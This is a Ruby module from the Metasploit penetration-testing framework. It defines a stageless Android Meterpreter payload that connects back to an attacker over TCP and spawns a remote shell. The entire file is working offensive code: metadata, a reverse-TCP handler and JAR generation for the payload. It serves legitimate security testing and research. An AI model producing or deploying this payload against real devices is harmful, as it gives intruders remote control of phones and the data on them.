##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/android'
require 'msf/core/payload/transport_config'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::TransportConfig
  include Msf::Payload::Single
  include Msf::Payload::Android
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Meterpreter Shell, Reverse TCP Inline',
      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'License'     => MSF_LICENSE,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
      'Payload'     => '',
    ))
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_jar(opts={})
    opts[:stageless] = true
    super(opts)
  end
end
